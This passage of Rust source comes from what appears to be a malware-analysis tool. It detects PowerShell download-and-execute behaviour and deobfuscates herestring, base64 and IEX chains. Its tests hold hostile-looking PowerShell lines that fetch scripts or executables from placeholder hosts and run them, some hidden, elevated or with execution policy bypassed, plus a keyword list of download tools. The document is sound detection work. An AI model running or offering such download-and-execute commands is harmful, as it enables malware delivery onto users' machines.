        if !seen.insert((url.clone(), dst.clone())) {
            continue;
        }
        out.push((url, dst));
    }
    out
}

fn ps_webrequest_filestream_downloads(text: &str) -> Vec<(String, String)> {
    if !contains_ascii_case_insensitive_bytes(text, b"webrequest")
        || !contains_ascii_case_insensitive_bytes(text, b"filestream")
        || !contains_ascii_case_insensitive_bytes(text, b"getresponsestream")
    {
        return Vec::new();
    }

    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in WEBREQUEST_FILESTREAM_RE.captures_iter(text) {
        let (Some(url), Some(dst)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(src) = normalize_ps_download_url(url.as_str()) else {
            continue;
        };
        let dst = dst.as_str().to_string();
        if seen.insert((src.clone(), dst.clone())) {
            out.push((src, dst));
        }
    }
    out
}

pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for (src, dst) in ps_downloadfile_calls(text) {
        let Some(dst) = dst else {
            continue;
        };
        if seen.insert((src.clone(), dst.clone())) {
            out.push((src, dst));
        }
    }

    for (src, dst) in ps_webrequest_filestream_downloads(text) {
        if seen.insert((src.clone(), dst.clone())) {
            out.push((src, dst));
        }
    }

    let regex_atom_profile = PsUrlRegexAtomProfile::new(text);
    for spec in PS_URL_REGEX_SPECS {
        if !matches!(
            spec.atom_kind,
            PsUrlRegexAtomKind::Iwr
                | PsUrlRegexAtomKind::Irm
                | PsUrlRegexAtomKind::CurlExe
                | PsUrlRegexAtomKind::StartBits
        ) || !regex_atom_profile.matches(spec.atom_kind)
        {
            continue;
        }
        for caps in spec.regex.captures_iter(text) {
            let Some(url_match) = caps.get(1) else {
                continue;
            };
            if ps_url_inside_non_download_hash_option(text, url_match.start())
                || ps_url_is_non_download_option_value(text, url_match.start())
            {
                continue;
            }
            let statement = logical_statement_at(text, url_match.start());
            let mut url = clean_ps_url(url_match.as_str());
            if is_schemeless_ip_url(&url) {
                url = format!("http://{url}");
            }
            let Some(src) = crate::deob_scan::normalize_liberal_url_token(&url)
                .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
            else {
                continue;
            };
            let Some(dst) = outfile_hint_for_download(statement, &src) else {
                continue;
            };
            if seen.insert((src.clone(), dst.clone())) {
                out.push((src, dst));
            }
        }
    }

    out
}

fn ps_literal_url_arg(arg: &str) -> Option<String> {
    ps_literal_arg(arg).and_then(|value| normalize_ps_download_url(&value))
}

fn ps_url_arg(arg: &str, bindings: &std::collections::HashMap<String, String>) -> Option<String> {
    ps_string_arg(arg, bindings).and_then(|value| normalize_ps_download_url(&value))
}

fn ps_string_arg(
    arg: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    ps_literal_arg(arg)
        .or_else(|| ps_path_combine_arg(arg))
        .or_else(|| ps_variable_arg(arg, bindings))
}

fn ps_literal_arg(arg: &str) -> Option<String> {
    PS_QUOTED_LITERAL_RE.captures(arg).and_then(|literal_caps| {
        literal_caps
            .get(1)
            .or_else(|| literal_caps.get(2))
            .map(|m| m.as_str().replace("''", "'"))
    })
}

fn ps_variable_arg(
    arg: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let arg = arg.trim();
    let name = arg.strip_prefix('$')?;
    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
        return None;
    }
    bindings.get(&name.to_ascii_lowercase()).cloned()
}

fn ps_path_combine_arg(arg: &str) -> Option<String> {
    let caps = PS_PATH_COMBINE_ARG_RE.captures(arg)?;
    let base = ps_unquote_path_component(caps.get(1)?.as_str());
    let leaf = caps
        .get(2)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
    if base.is_empty() || leaf.is_empty() || is_large_literal_carrier(&leaf) {
        return None;
    }
    Some(join_ps_path_components(&base, &leaf))
}

fn split_ps_top_level_args(args: &str) -> Vec<&str> {
    let bytes = args.as_bytes();
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut depth = 0usize;
    let mut quote: Option<u8> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        let byte = bytes[i];
        if let Some(q) = quote {
            if byte == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match byte {
            b'\'' | b'"' => quote = Some(byte),
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
            b',' if depth == 0 => {
                parts.push(args[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= args.len() {
        parts.push(args[start..].trim());
    }
    parts
}

fn ps_literal_urls(text: &str) -> Vec<String> {
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .filter_map(|value| normalize_ps_download_url(&value))
        .collect()
}

fn normalize_ps_literal_url(value: &str) -> Option<String> {
    crate::deob_scan::normalize_liberal_url_token(&clean_ps_url(value))
}

fn normalize_ps_download_url(value: &str) -> Option<String> {
    let value = clean_ps_url(value);
    crate::deob_scan::normalize_liberal_url_token(&value)
        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&value))
}

fn ps_literal_urls_in_download_context(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("download")
        && !lower.contains("invoke-webrequest")
        && !lower.contains("invoke-restmethod")
    {
        return Vec::new();
    }
    let mut seen = std::collections::HashSet::new();
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| {
                    let value = m.as_str().to_string();
                    (m.start(), value)
                })
        })
        .filter_map(|(start, value)| {
            if !crate::deob_scan::looks_like_liberal_url(&value)
                || ps_url_inside_non_download_hash_option(text, start)
                || ps_url_is_non_download_option_value(text, start)
                || ps_url_is_path_filename_argument(text, start)
            {
                return None;
            }
            let url = normalize_ps_literal_url(&value)?;
            seen.insert(url.clone()).then_some(url)
        })
        .collect()
}

/// Run all URL-extraction patterns over each ps1 payload. Emit a Download
/// trait for each unique (url, payload_idx) pair found.
// Matches `[Convert]::FromBase64String('...')` or `[System.Convert]::FromBase64String('...')`
// at the top level of a PS payload. Captures: 1=base64 string.
#[allow(clippy::expect_used)]
static OUTER_FROMBASE64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*'([A-Za-z0-9+/=]{32,})'\s*\)"#,
    )
    .expect("outer frombase64 literal")
});

#[cfg(test)]
mod herestring_iex_tests {
    use super::*;

    #[test]
    fn normalize_summarizes_large_binary_string_literal() {
        let binary = format!(
            "{}\u{fffd}{}",
            "\x01\x02\x03\x04".repeat(1200),
            "\x05".repeat(1200)
        );
        let ps = format!(
            "$blob = '{binary}'; Invoke-WebRequest -Uri 'https://binary-lit.example/p.ps1'"
        );
        let normalized = normalize_ps1_text(&ps);

        assert!(
            normalized.contains("omitted") && normalized.contains("PowerShell string literal"),
            "binary literal was not summarized:\n{}",
            normalized
        );
        assert!(
            normalized.contains("https://binary-lit.example/p.ps1"),
            "URL literal should remain visible:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("\\x01\\x02\\x03\\x04\\x01\\x02"),
            "binary literal was escaped instead of summarized"
        );
    }

    #[test]
    fn normalize_preserves_large_text_string_literal() {
        let text = "A".repeat(5000);
        let ps = format!("$blob = '{text}'; Write-Host done");
        let normalized = normalize_ps1_text(&ps);

        assert!(
            normalized.contains(&text) && !normalized.contains("omitted"),
            "plain text literal should not be summarized"
        );
    }

    #[test]
    fn joins_backtick_line_continuations() {
        let text = "Invoke-Web`  \r\nRequest -Uri http://x.example/p\nWrite-Host done";
        assert_eq!(
            join_powershell_line_continuations(text),
            "Invoke-WebRequest -Uri http://x.example/p\nWrite-Host done"
        );
    }

    #[test]
    fn extracts_clean_herestring_replace_iex() {
        let text = "$myvar=@'\nthis is INNERSTRIP body\n'@\n$other=$myvar -replace 'INNERSTRIP',''\niex $other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
    #[test]
    fn extracts_doubled_quote_herestring() {
        // Same chain wrapped in outer single-quote literal: internal quotes
        // doubled, IEX written as `&('Invoke-Expression')$var`.
        let text = "$myvar=@''\nthis is INNERSTRIP body\n''@\n$other=$myvar -replace ''INNERSTRIP'',''''\n&('Invoke-Expression')$other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }

    #[test]
    fn inline_powershell_gate_ignores_copied_binary_path() {
        let text = "copy /y c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe script.bat.exe\nscript.bat.exe -enc AAAA";
        assert!(!inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_encoded_invocation() {
        let text = "powershell.exe -enc AAAA";
        assert!(inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_mixed_case_encoded_invocation() {
        let text = "PoWeRsHeLl.ExE -EnC AAAA";
        assert!(inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_short_encoded_invocation() {
        let text = "powershell.exe -e AAAA";
        assert!(inline_powershell_text_has_payload_signal(text));
    }

    #[test]
    fn inline_powershell_gate_allows_canonicalized_payload_shortcuts() {
        for text in [
            "powershell.exe -ec AAAA",
            "pwsh /co Invoke-WebRequest https://payload.example/a",
        ] {
            assert!(
                inline_powershell_text_has_payload_signal(text),
                "missed shortcut: {text}"
            );
        }
    }

    #[test]
    fn inline_powershell_large_launch_text_uses_candidate_lines() {
        let mut text = "rem filler\r\n".repeat(60_000);
        text.push_str("powershell.exe -Command \"iwr https://inline-candidate.example/a\"\r\n");
        text.push_str(&"rem tail\r\n".repeat(60_000));

        let candidate = inline_powershell_scan_text(&text);

        assert!(
            candidate.len() < text.len() / 100,
            "candidate scan text should avoid feeding filler to ps1 scanner"
        );
        assert!(candidate.contains("inline-candidate.example/a"));
    }

    #[test]
    fn inline_powershell_large_global_payload_keeps_full_text() {
        let mut text = "$u='https://global-inline.example/a'\r\n".to_string();
        text.push_str(&"rem filler\r\n".repeat(60_000));
        text.push_str("$wc=New-Object Net.WebClient;$wc.DownloadString($u)\r\n");

        let candidate = inline_powershell_scan_text(&text);

        assert_eq!(candidate.len(), text.len());
    }

    #[test]
    fn ps1_download_gate_allows_direct_and_alias_downloads() {
        for text in [
            "Invoke-WebRequest -Uri https://payload.example/a -OutFile a.exe",
            "iwr payload.example/a -OutFile a.exe",
            "curl.exe https://payload.example/a -o a.exe",
            "Start-BitsTransfer -Source payload.example/a -Destination a.exe",
            "mshta https://payload.example/a.hta",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_allows_encoded_and_obfuscated_downloads() {
        for text in [
            "$x=[Convert]::FromBase64String('aHR0cHM6Ly9wYXlsb2FkLmV4YW1wbGUvYQ==')",
            "[Text.Encoding]::UTF8.GetString($bytes)",
            "[char]73+[char]110+[char]118+[char]111+[char]107+[char]101",
            "$wc = New-Object Net.WebClient; $wc.DownloadString($u)",
            ".('DownloadString').Invoke('https://payload.example/a')",
            "CallByName($wc,'DownloadString','Get','https://payload.example/a')",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_allows_corpus_string_index_decoder_shapes() {
        for text in [
            "Get-Service;$f='func';Get-History;$f+='t';$f+='ion:';(ni -p $f)",
            "$x=${host}.Runspace;If ($x) {$n++;$s+='payload'}",
            "spsv marker;function Decode($s){$out+=$s[$i]};Decode $blob",
        ] {
            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
        }
    }

    #[test]
    fn ps1_download_gate_blocks_benign_inventory_payloads() {
        for text in [
            "Get-CimInstance Win32_OperatingSystem | Select-Object Caption",
            "$name = [System.Net.Dns]::GetHostName(); Write-Host $name",
            "Start-Process notepad.exe",
        ] {
            assert!(
                !ps1_payload_has_download_signal(text),
                "allowed benign text: {text}"
            );
        }
    }

    #[test]
    fn ps1_scan_caches_normalized_payloads() {
        let payload =
            b"Invoke-WebRequest -Uri 'https://cache.example/payload.ps1' -OutFile payload.ps1"
                .to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload.clone());

        scan_ps1_payloads(&mut env);

        assert!(
            env.ps1_normalized_cache.contains_key(payload.as_slice()),
            "normalized payload was not cached"
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://cache.example/payload.ps1")
            }),
            "download URL was not extracted: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_iwr_content_redirect_destination_extracted() {
        let payload = br#"echo (iwr https://redirect-content.example/stage.ps1).content > "$env:APPDATA\stage.ps1"; powershell "$env:APPDATA\stage.ps1""#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::Download { src, dst, .. }
                        if src == "https://redirect-content.example/stage.ps1"
                            && dst.as_deref()
                                == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage.ps1")
                )
            }),
            "redirected content download destination was not extracted: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloaded_script_execution_emits_url_argument() {
        let payload = br#"iwr 'https://script-exec.example/dl.ps1' -out $env:TEMP\dl.ps1 -useb; if (Test-Path $env:TEMP\dl.ps1) { powershell -ep bypass -f $env:TEMP\dl.ps1 }"#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { url, .. }
                        if url == "https://script-exec.example/dl.ps1"
                )
            }),
            "downloaded script execution was not linked to source URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloaded_js_wscript_execution_emits_url_argument() {
        let payload = br#"IWR -useb 'https://script-host.example/payload.js' -outf $env:tmp\\payload.js; wscript $env:tmp\\payload.js"#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { url, .. }
                        if url == "https://script-host.example/payload.js"
                )
            }),
            "downloaded script-host execution was not linked to source URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloadfile_then_file_execution_emits_execution_url_argument() {
        let payload = br#"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://script-exec.example/install.ps1', '%TEMP%\Install.ps1')"
powershell -ExecutionPolicy Bypass -File "%TEMP%\Install.ps1"
"#
        .to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { cmd, url }
                        if url == "https://script-exec.example/install.ps1"
                            && cmd.contains("-File \"%TEMP%\\Install.ps1")
                )
            }),
            "downloaded PowerShell -File execution was not linked to source URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloaded_batch_start_process_emits_url_argument() {
        let payload = br#"(New-Object System.Net.WebClient).DownloadFile('https://script-exec.example/install.bat', '%TEMP%\Install.bat'); Start-Process -FilePath '%TEMP%\Install.bat'""#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { cmd, url }
                        if url == "https://script-exec.example/install.bat"
                            && cmd.contains("Start-Process -FilePath")
                            && cmd.contains("'%TEMP%\\Install.bat'")
                )
            }),
            "downloaded batch Start-Process execution was not linked to source URL: {:?}",
            env.traits
        );
        assert_eq!(
            env.traits
                .iter()
                .filter(|t| matches!(
                    t,
                    crate::traits::Trait::UrlArgument { url, .. }
                        if url == "https://script-exec.example/install.bat"
                ))
                .count(),
            1,
            "wrapper-quote variants should dedupe: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloaded_exe_start_process_emits_url_argument() {
        let payload = br#"Invoke-WebRequest -Uri 'https://script-exec.example/drop.exe' -OutFile '%TEMP%\drop.exe'; Start-Process '%TEMP%\drop.exe' -WindowStyle Hidden"#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { cmd, url }
                        if url == "https://script-exec.example/drop.exe"
                            && cmd.contains("Start-Process")
                            && cmd.contains("'%TEMP%\\drop.exe'")
                )
            }),
            "downloaded exe Start-Process execution was not linked to source URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_downloaded_batch_cmd_argumentlist_emits_url_argument() {
        let payload = br#"Invoke-WebRequest -Uri 'https://script-exec.example/elevate.bat' -OutFile '%TEMP%\elevate.bat'; Start-Process cmd -ArgumentList '/c %TEMP%\elevate.bat' -Verb RunAs"#.to_vec();
        let mut env = crate::env::Environment::new(&crate::env::Config::default());
        env.all_extracted_ps1.push(payload);

        scan_ps1_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::UrlArgument { cmd, url }
                        if url == "https://script-exec.example/elevate.bat"
                            && cmd.contains("Start-Process cmd")
                            && cmd.contains("'/c %TEMP%\\elevate.bat'")
                )
            }),
            "downloaded batch cmd ArgumentList execution was not linked to source URL: {:?}",
            env.traits
        );
    }
}

/// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
/// herestring + `-replace` + IEX chain (sometimes wrapped in one round of
/// `[Convert]::FromBase64String('...')`). When found, push the decoded inner
/// PS body to `env.all_extracted_ps1` so the main scan picks it up.
fn extract_herestring_replace_iex_inners(env: &mut Environment) {
    let mut payloads = std::mem::take(&mut env.all_extracted_ps1);
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> = payloads.iter().cloned().collect();
    for payload in &payloads {
        let text = String::from_utf8_lossy(payload).into_owned();
        // Candidate texts: the raw payload, plus one round of base64 decoding
        // for `[Convert]::FromBase64String('...')` wrappers.
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            let s = decode_payload(&decoded).into_owned();
            candidates.push(s);
        }
        for cand in candidates {
            let bodies = extract_herestring_replace_iex_from_text(&cand);
            for body in bodies {
                let bytes = body.into_bytes();
                if seen.insert(bytes.clone()) {
                    new_payloads.push(bytes);
                }
            }
        }
    }
    payloads.extend(new_payloads);
    payloads.append(&mut env.all_extracted_ps1);
    env.all_extracted_ps1 = payloads;
}

/// Find every `$VAR = @'...'@ ; $VAR2 = $VAR -replace 'X','Y' ; iex $VAR2`
/// chain in `text` and return the decoded inner bodies.
fn extract_herestring_replace_iex_from_text(text: &str) -> Vec<String> {
    use std::collections::HashMap;
    let mut here: HashMap<String, String> = HashMap::new();
    for caps in PS_HERESTRING_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else { continue };
        let Some(body) = caps.get(2) else { continue };
        here.insert(
            name.as_str().to_ascii_lowercase(),
            body.as_str().to_string(),
        );
    }
    if here.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for caps in PS_VAR_REPLACE_ASSIGN_RE.captures_iter(text) {
        let dest = match caps.get(1) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let src = match caps.get(2) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let Some(src_body) = here.get(&src) else {
            continue;
        };
        let needle = match caps.get(3) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let repl = match caps.get(4) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let src_body = src_body.replace("''", "'");
        let iex_pat = format!(
            r#"(?i)(?:iex\b|invoke-expression\b|&\s*\(\s*'invoke[-' ]*expression'\s*\)|&\s*\(\s*'invoke'\s*\+\s*'-expression'\s*\))\s*\$(?-i:{dest})\b"#,
            dest = regex::escape(&dest)
        );
        let Ok(iex_re) = regex::Regex::new(&iex_pat) else {
            continue;
        };
        if !iex_re.is_match(text) {
            continue;
        }
        let decoded = if needle.is_empty() {
            src_body
        } else {
            src_body.replace(needle.as_str(), repl.as_str())
        };
        if decoded.trim().is_empty() {
            continue;
        }
        out.push(decoded);
    }
    out
}

pub fn scan_ps1_payloads(env: &mut Environment) {
    let ps1_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_PS1_SCAN").is_some();
    let ps1_profile_start = std::time::Instant::now();
    let traits_before_scan = env.traits.len();
    macro_rules! ps1_profile_emit {
        ($stage:literal, $elapsed:expr, $payloads:expr, $bytes:expr, $added_traits:expr) => {
            if ps1_profile_enabled {
                eprintln!(
                    "harrington_profile_ps1_scan stage={} delta_ms={} payloads={} bytes={} added_traits={}",
                    $stage,
                    $elapsed.as_millis(),
                    $payloads,
                    $bytes,
                    $added_traits
                );
            }
        };
    }

    // Pre-pass: extract herestring + -replace + IEX inner payloads from raw
    // PS bytes, decoding one round of outer `[Convert]::FromBase64String(...)`
    // first. Adds decoded inners to `all_extracted_ps1` so the main scan loop
    // sees them. Run on raw bytes (before strip_marker_noise) so the marker-
    // noise stripper doesn't eat the `-replace` target chars from inside the
    // herestring body.
    let prepass_start = std::time::Instant::now();
    extract_herestring_replace_iex_inners(env);
    ps1_profile_emit!(
        "extract_herestring_replace_iex_inners",
        prepass_start.elapsed(),
        env.all_extracted_ps1.len(),
        env.all_extracted_ps1.iter().map(Vec::len).sum::<usize>(),
        env.traits.len().saturating_sub(traits_before_scan)
    );

    // Use all_extracted_ps1 to cover every payload across the run, not just
    // the latest exec_ps1 (which gets drained).
    let mut payloads = std::mem::take(&mut env.all_extracted_ps1);
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    let payload_bytes = payloads.iter().map(Vec::len).sum::<usize>();
    let mut decoded_payloads = 0usize;
    let mut skipped_payloads = 0usize;
    let mut scanned_payloads = 0usize;
    let mut candidate_texts = 0usize;
    let mut decode_elapsed = std::time::Duration::ZERO;
    let mut signal_elapsed = std::time::Duration::ZERO;
    let mut expand_elapsed = std::time::Duration::ZERO;
    let mut cache_normalize_elapsed = std::time::Duration::ZERO;
    let mut alias_elapsed = std::time::Duration::ZERO;
    let mut downloadfile_elapsed = std::time::Duration::ZERO;
    let mut regex_elapsed = std::time::Duration::ZERO;
    let mut dynamic_elapsed = std::time::Duration::ZERO;
    let mut literal_elapsed = std::time::Duration::ZERO;

    for (idx, payload) in payloads.iter().enumerate() {
        let stage_start = std::time::Instant::now();
        let raw_owned = decode_payload(payload).into_owned();
        decode_elapsed += stage_start.elapsed();
        decoded_payloads += 1;

        let env_stage_start = std::time::Instant::now();
        let text_env_expanded = expand_ps_environment_references(&raw_owned, env);
        expand_elapsed += env_stage_start.elapsed();

        let stage_start = std::time::Instant::now();
        if !ps1_payload_has_download_signal(&text_env_expanded) {
            signal_elapsed += stage_start.elapsed();
            skipped_payloads += 1;
            continue;
        }
        signal_elapsed += stage_start.elapsed();
        scanned_payloads += 1;

        let stage_start = std::time::Instant::now();
        let text_expanded = expand_obfuscation(&text_env_expanded);
        expand_elapsed += stage_start.elapsed();
        if env.ps1_scan_cache_normalized {
            let stage_start = std::time::Instant::now();
            env.ps1_normalized_cache
                .entry(payload.clone())
                .or_insert_with(|| normalize_expanded_ps1_text(&text_expanded));
            cache_normalize_elapsed += stage_start.elapsed();
        }
        // Dual-scan: also run URL regexes over alias-expanded version so that
        // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
        // didn't surface them.
        let stage_start = std::time::Instant::now();
        let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
        alias_elapsed += stage_start.elapsed();
        let candidates: Vec<String> = if text_aliased != text_expanded {
            vec![text_expanded, text_aliased]
        } else {
            vec![text_expanded]
        };
        candidate_texts += candidates.len();

        // Use the first candidate for OutFile hints and forensic command context.
        let primary = &candidates[0];
        let command_context = format!("(ps1 #{idx}) {primary}");

        for text in &candidates {
            let stage_start = std::time::Instant::now();
            for (url, dst) in ps_downloadfile_calls(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                push_download_and_execution_url_argument(
                    env,
                    command_context.clone(),
                    url,
                    dst,
                    text,
                );
            }
            downloadfile_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for (url, dst) in dynamic_download_invoke_downloads(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                push_download_and_execution_url_argument(
                    env,
                    command_context.clone(),
                    url,
                    dst.or_else(|| outfile_hint_from(primary)),
                    primary,
                );
            }
            dynamic_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for (url, dst) in ps_webrequest_filestream_downloads(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                push_download_and_execution_url_argument(
                    env,
                    command_context.clone(),
                    url,
                    Some(dst),
                    primary,
                );
            }
            dynamic_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            let regex_atom_profile = PsUrlRegexAtomProfile::new(text);
            for spec in PS_URL_REGEX_SPECS {
                if !regex_atom_profile.matches(spec.atom_kind) {
                    continue;
                }
                for caps in spec.regex.captures_iter(text) {
                    let Some(url_match) = caps.get(1) else {
                        continue;
                    };
                    if ps_url_inside_non_download_hash_option(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_is_non_download_option_value(text, url_match.start()) {
                        continue;
                    }
                    if matches!(spec.atom_kind, PsUrlRegexAtomKind::UrlScheme)
                        && ps_url_is_path_filename_argument(text, url_match.start())
                    {
                        continue;
                    }
                    let mut url = clean_ps_url(url_match.as_str());
                    if is_schemeless_ip_url(&url) {
                        url = format!("http://{url}");
                    }
                    let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url)
                        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
                    else {
                        continue;
                    };
                    if !seen.insert((idx, url.clone())) {
                        continue;
                    }
                    let statement = caps
                        .get(0)
                        .map(|m| logical_statement_at(text, m.start()))
                        .unwrap_or(primary);
                    let dst_hint = outfile_hint_for_download(statement, &url);
                    push_download_and_execution_url_argument(
                        env,
                        command_context.clone(),
                        url,
                        dst_hint,
                        text,
                    );
                }
            }
            regex_elapsed += stage_start.elapsed();

            let stage_start = std::time::Instant::now();
            for url in ps_literal_urls_in_download_context(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                push_download_and_execution_url_argument(
                    env,
                    command_context.clone(),
                    url,
                    outfile_hint_from(primary),
                    primary,
                );
            }
            literal_elapsed += stage_start.elapsed();
        }
    }
    let added_traits = env.traits.len().saturating_sub(traits_before_scan);
    ps1_profile_emit!(
        "decode_payload",
        decode_elapsed,
        decoded_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "download_signal",
        signal_elapsed,
        skipped_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "expand_obfuscation",
        expand_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "cache_normalize",
        cache_normalize_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "alias_expand",
        alias_elapsed,
        scanned_payloads,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "downloadfile_calls",
        downloadfile_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "regex_extractors",
        regex_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "dynamic_downloads",
        dynamic_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "literal_context_urls",
        literal_elapsed,
        candidate_texts,
        payload_bytes,
        added_traits
    );
    ps1_profile_emit!(
        "total",
        ps1_profile_start.elapsed(),
        payloads.len(),
        payload_bytes,
        added_traits
    );
    payloads.append(&mut env.all_extracted_ps1);
    env.all_extracted_ps1 = payloads;
}

fn ps1_payload_has_download_signal(text: &str) -> bool {
    const ATOMS: &[&[u8]] = &[
        b"http:",
        b"https:",
        b"ftp:",
        b"file:",
        b"invoke-webrequest",
        b"invoke-restmethod",
        b"iwr",
        b"irm",
        b"wget",
        b"curl",
        b"curl.exe",
        b"mshta",
        b"downloadstring",
        b"downloadfile",
        b"downloaddata",
        b"openread",
        b"start-bitstransfer",
        b"webclient",
        b"webrequest",
        b"frombase64string",
        b"getstring",
        b"[char]",
        b"callbyname",
        b".invoke",
        b"loadstring",
        b"adstring",
        b"get-history",
        b"runspace",
        b"function",
    ];

    ATOMS
        .iter()
        .any(|atom| contains_ascii_case_insensitive_bytes(text, atom))
}

